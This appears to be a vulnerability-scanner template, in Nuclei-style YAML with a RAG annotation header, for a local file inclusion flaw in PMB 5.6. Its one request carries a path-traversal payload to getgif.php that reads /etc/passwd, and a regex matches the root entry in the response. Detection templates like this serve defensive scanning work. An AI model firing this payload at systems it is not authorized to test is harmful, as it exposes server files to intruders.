# RAG Annotation:
# name: PMB 5.6 - Local File Inclusion
# description: PMB 5.6 is vulnerable to local file inclusion.
# vuln_type: Local File Inclusion
# severity: high
# cve_id: N/A


---
id: pmb-local-file-disclosure

info:
  name: PMB 5.6 - Local File Inclusion
  author: dhiyaneshDk
  severity: high
  description: PMB 5.6 is vulnerable to local file inclusion.
  reference:
    - https://www.exploit-db.com/exploits/49054
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  metadata:
    max-request: 1
  tags: lfi,pmb,edb,vuln

http:
  - method: GET
    path:
      - '{{BaseURL}}/pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif={{rand_base(4)}}'

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200